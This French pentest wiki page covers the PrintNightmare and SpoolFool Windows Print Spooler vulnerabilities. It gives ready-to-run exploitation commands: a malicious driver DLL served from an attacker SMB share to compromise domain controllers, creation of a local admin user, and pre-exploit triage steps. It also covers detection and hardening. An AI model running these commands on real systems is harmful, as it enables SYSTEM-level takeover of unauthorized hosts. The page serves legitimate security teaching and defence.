# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare est le nom collectif donné à une famille de vulnérabilités du service **Print Spooler** de Windows qui permettent l’**exécution de code arbitraire en tant que SYSTEM** et, lorsque le spooler est accessible via RPC, l’**exécution de code à distance (RCE) sur les contrôleurs de domaine et les serveurs de fichiers**. Les CVE les plus exploitées sont **CVE-2021-1675** (initialement classée comme LPE) et **CVE-2021-34527** (RCE complète). Des problèmes ultérieurs tels que **CVE-2021-34481 (“Point & Print”)** et **CVE-2022-21999 (“SpoolFool”)** prouvent que la surface d’attaque est encore loin d’être entièrement corrigée.

Si vous recherchez la **coercition d’authentification / relay** via le spooler plutôt que la **RCE/LPE basée sur des drivers**, consultez [cette autre page consacrée à l’abus de la coercition des imprimantes](printers-spooler-service-abuse.md). Cette page se concentre sur le **chargement de drivers / DLLs en tant que SYSTEM**.

---

## 1. Composants vulnérables et CVE

| Année | CVE | Nom court | Primitive | Remarques |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Corrigée dans le CU de juin 2021, mais contournée par CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` permet aux utilisateurs authentifiés de charger une DLL de driver depuis un partage distant ; après août 2021, cela nécessite généralement des politiques Point & Print affaiblies|
|2021|CVE-2021-34481|“Point & Print”|LPE|Installation de drivers non signés par des utilisateurs non administrateurs|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Création arbitraire de répertoires → DLL planting – fonctionne après les correctifs de 2021|

Toutes ces vulnérabilités abusent l’une des **méthodes RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ou des relations de confiance au sein de **Point & Print**.

## 2. Techniques d’exploitation

### 2.1 Compromission à distance d’un contrôleur de domaine (CVE-2021-34527)

Un utilisateur de domaine authentifié mais **sans privilèges** peut exécuter des DLLs arbitraires en tant que **NT AUTHORITY\SYSTEM** sur un spooler distant (souvent le DC) en :
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Les PoCs populaires incluent **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) ainsi que les modules `misc::printnightmare / lsa::addsid` de Benjamin Delpy dans **mimikatz**.

### 2.2 Escalade de privilèges locale (tout Windows pris en charge, 2021-2024)

La même API peut être appelée **localement** pour charger un driver depuis `C:\Windows\System32\spool\drivers\x64\3\` et obtenir des privilèges SYSTEM :
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Triage moderne sur les hôtes corrigés

Sur un hôte entièrement mis à jour, les PoCs publics de PrintNightmare échouent souvent, car Windows utilise désormais par défaut l’**installation des pilotes d’imprimante réservée aux administrateurs** (`RestrictDriverInstallationToAdministrators=1` depuis le 10 août 2021). Avant de lancer un exploit contre une cible, vérifiez d’abord si l’environnement a annulé cette mesure de sécurité pour les déploiements d’imprimantes hérités :<sup>[[3]](#references)</sup>
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Les deux valeurs faibles les plus intéressantes sont généralement :<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Depuis Linux, vérifiez rapidement que la cible expose les interfaces RPC d'impression pertinentes avant d'exécuter un PoC :
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Certains outils publics plus récents proposent également un workflow **check/list** plus sûr avant l’envoi d’une DLL :
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Si vous obtenez `RPC_E_ACCESS_DENIED` (`0x8001011b`) en tant qu’utilisateur à faibles privilèges, vous êtes généralement confronté au comportement par défaut postérieur à 2021, et non à une défaillance du transport.

> Sur Windows 11 22H2+ et les versions clientes plus récentes, l’impression à distance utilise par défaut **RPC over TCP**, tandis que **RPC over named pipes** (`\PIPE\spoolss`) est désactivé, sauf s’il est explicitement réactivé. Certains anciens PoC et documents de laboratoire supposent encore que le named pipe est accessible.<sup>[[4]](#references)</sup>

### 2.4 Abus de Package Point & Print sur des réseaux « patchés »

De nombreux environnements d’entreprise sont restés **vulnérables par configuration** après les patches initiaux de 2021, car les workflows du helpdesk ou des print servers nécessitaient toujours que des utilisateurs non administrateurs installent ou mettent à jour des drivers. En pratique, le playbook offensif devient le suivant :

- Si les security prompts sont complètement désactivés, **classic arbitrary-DLL PrintNightmare** reste la voie la plus courte.
- Si `Only use Package Point and Print` est activé, vous devez généralement vous orienter vers une voie utilisant un **signed package-aware driver**, plutôt que vers un simple dépôt de DLL.<sup>[[3]](#references)</sup>
- Des recherches menées en 2024 ont montré que **`Package Point and Print - Approved servers` ne constitue pas à lui seul une frontière de confiance stricte** : si un attaquant peut usurper ou détourner la résolution de noms pour un print server approuvé, les victimes peuvent toujours être redirigées vers un serveur malveillant qui satisfait aux contrôles de la policy.<sup>[[4]](#references)</sup>
- Même la combinaison du renforcement UNC avec le forçage de **RPC-over-SMB** peut être instable, car les clients modernes peuvent **basculer vers RPC over TCP**.<sup>[[4]](#references)</sup>

C’est pourquoi l’exploitation moderne de type PrintNightmare consiste souvent davantage à **abuser de la policy de déploiement des imprimantes d’entreprise** qu’à rejouer le PoC original de 2021 sans modification.

### 2.5 SpoolFool (CVE-2022-21999) – contournement des correctifs de 2021

Les patches 2021 de Microsoft ont bloqué le chargement distant de drivers, mais **n’ont pas renforcé les permissions des répertoires**. SpoolFool abuse du paramètre `SpoolDirectory` pour créer un répertoire arbitraire sous `C:\Windows\System32\spool\drivers\`, y dépose une DLL de payload, puis force le spooler à la charger :<sup>[[2]](#references)</sup>
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> L’exploit fonctionne sur Windows 7 → Windows 11 et Server 2012R2 → 2022 entièrement corrigés avant les mises à jour de février 2022<sup>[[2]](#references)</sup>

---

## 3. Détection & hunting

* **Journaux PrintService** – activez le canal *Microsoft-Windows-PrintService/Operational* et surveillez **Event ID 316** (pilote ajouté/mis à jour, inclut généralement les noms des DLL) lors des tentatives réussies et échouées. Associez-le à **Event ID 808/811** pour détecter les échecs suspects de chargement de modules/pilotes du spooler.
* **Sysmon** – `Event ID 7` (Image loaded) ou `11/23` (File write/delete) dans `C:\Windows\System32\spool\drivers\*` lorsque le processus parent est **spoolsv.exe**.
* **Lignée des processus** – déclenchez une alerte lorsque **spoolsv.exe** lance `cmd.exe`, `rundll32.exe`, PowerShell ou tout autre processus enfant inattendu et non signé.
* **Télémétrie réseau** – les récupérations SMB inattendues effectuées par `spoolsv.exe` depuis des partages contrôlés par l’attaquant, ou un trafic RPC d’imprimante inhabituel provenant de serveurs qui ne devraient pas agir comme serveurs d’impression, sont deux pistes très pertinentes.

## 4. Mitigation & hardening

1. **Appliquez les correctifs !** – Installez la dernière mise à jour cumulative sur chaque hôte Windows où le service Print Spooler est installé.
2. **Désactivez le spooler lorsqu’il n’est pas requis**, en particulier sur les Domain Controllers :
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Bloquez les connexions distantes** tout en autorisant l’impression locale – Group Policy : `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Réservez Point & Print aux administrateurs** en configurant :
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Instructions détaillées dans Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Si les exigences métier imposent `RestrictDriverInstallationToAdministrators=0`, considérez toutes les autres stratégies d’imprimante comme une **mitigation partielle uniquement**. Au minimum, privilégiez les **package-aware drivers**, activez **Only use Package Point and Print** et limitez **Package Point and Print - Approved servers** à des serveurs d’impression explicitement autorisés dans la forêt.<sup>[[3]](#references)</sup>
6. **Ne rétablissez pas la confidentialité RPC des imprimantes** uniquement pour corriger des mappages d’imprimantes défaillants. Les environnements qui définissent `RpcAuthnLevelPrivacyEnabled=0` annulent le hardening ajouté pour **CVE-2021-1678** et méritent généralement une attention particulière lors d’un engagement.<sup>[[4]](#references)</sup>

---

## 5. Recherches / outils associés

* Modules `printnightmare` de [mimikatz](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – implémentation Impacket standard avec les modes `-check`, `-list` et `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper intégrant la distribution SMB, la prise en charge de plusieurs cibles et les modes `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – exploitation de pilotes d’imprimante vulnérables fournis par l’attaquant via package Point & Print
* Exploit et write-up de SpoolFool
* Micro-patchs 0patch pour SpoolFool et d’autres vulnérabilités du spooler

Si vous souhaitez **forcer une authentification** via le spooler plutôt que charger un pilote, consultez [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## Références

- [1] [Microsoft – KB5005652: Manage new Point & Print default driver installation behavior](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – A Practical Guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – The PrintNightmare is not Over Yet](https://itm4n.github.io/printnightmare-not-over/)

{{#include ../../banners/hacktricks-training.md}}
